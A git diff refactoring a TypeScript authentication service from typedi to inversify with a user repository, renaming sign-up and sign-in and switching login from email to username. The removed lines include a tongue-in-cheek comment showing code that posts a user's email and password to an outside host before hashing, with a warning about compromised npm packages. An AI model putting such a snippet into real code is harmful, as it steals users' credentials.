@@ -1,56 +1,42 @@
-import { Service, Inject } from 'typedi';
+import { Inject } from 'typedi';
 import jwt from 'jsonwebtoken';
 import MailerService from './mailer';
 import config from '@/config';
 import argon2 from 'argon2';
 import { randomBytes } from 'crypto';
 import { IUser, IUserInputDTO } from '@/interfaces/IUser';
+import { UserRepository } from '@/repositories/userRepository';
+import { inject, injectable } from 'inversify';
 
-@Service()
+@injectable()
 export default class AuthService {
+
+  protected userRepositoryInstance: UserRepository;
   constructor(
-    @Inject('userModel') private userModel: Models.UserModel,
-    private mailer: MailerService,
     @Inject('logger') private logger,
+    @inject(UserRepository) userRepository: UserRepository
   ) {
+    this.userRepositoryInstance = userRepository;
   }
 
-  public async SignUp(userInputDTO: IUserInputDTO): Promise<{ user: IUser; token: string }> {
+  public async signUp(userInputDTO: IUserInputDTO): Promise<{ user: IUser; token: string }> {
     try {
       const salt = randomBytes(32);
 
-      /**
-       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
-       * require('http')
-       *  .request({
-       *     hostname: 'http://my-other-api.com/',
-       *     path: '/store-credentials',
-       *     port: 80,
-       *     method: 'POST',
-       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
-       *
-       * Just kidding, don't do that!!!
-       *
-       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
-       * watches every API call and if it spots a 'password' and 'email' property then
-       * it decides to steal them!? Would you even notice that? I wouldn't :/
-       */
       this.logger.silly('Hashing password');
       const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
+
       this.logger.silly('Creating user db record');
-      const userRecord = await this.userModel.create({
-        ...userInputDTO,
-        salt: salt.toString('hex'),
-        password: hashedPassword,
-      });
+      const userRecord = await this.userRepositoryInstance.createUser(userInputDTO, salt.toString('hex'), hashedPassword);
+
       this.logger.silly('Generating JWT');
       const token = this.generateToken(userRecord);
 
       if (!userRecord) {
         throw new Error('User cannot be created');
       }
-      this.logger.silly('Sending welcome email');
-      await this.mailer.SendWelcomeEmail(userRecord);
+      // this.logger.silly('Sending welcome email');
+      // await this.mailer.SendWelcomeEmail(userRecord);
 
       /**
        * @TODO This is not the best way to deal with this
@@ -58,7 +44,7 @@ export default class AuthService {
        * that transforms data from layer to layer
        * but that's too over-engineering for now
        */
-      const user = userRecord.toObject();
+      const user = userRecord
       Reflect.deleteProperty(user, 'password');
       Reflect.deleteProperty(user, 'salt');
       return { user, token };
@@ -68,8 +54,8 @@ export default class AuthService {
     }
   }
 
-  public async SignIn(email: string, password: string): Promise<{ user: IUser; token: string }> {
-    const userRecord = await this.userModel.findOne({ email });
+  public async signIn(username: string, password: string): Promise<{ user: IUser; token: string }> {
+    const userRecord = await this.userRepositoryInstance.findUserByUsername(username);
     if (!userRecord) {
       throw new Error('User not registered');
     }
@@ -83,7 +69,7 @@ export default class AuthService {
       this.logger.silly('Generating JWT');
       const token = this.generateToken(userRecord);
 
-      const user = userRecord.toObject();
+      const user = userRecord;
       Reflect.deleteProperty(user, 'password');
       Reflect.deleteProperty(user, 'salt');
       /**
@@ -109,10 +95,10 @@ export default class AuthService {
      * because it doesn't have _the secret_ to sign it
      * more information here: https://softwareontheroad.com/you-dont-need-passport
      */
-    this.logger.silly(`Sign JWT for userId: ${user._id}`);
+    this.logger.silly(`Sign JWT for userId: ${user.id}`);
     return jwt.sign(
       {
-        _id: user._id, // We are gonna use this in the middleware 'isAuth'
+        id: user.id, // We are gonna use this in the middleware 'isAuth'
         role: user.role,
         name: user.name,
         exp: exp.getTime() / 1000,
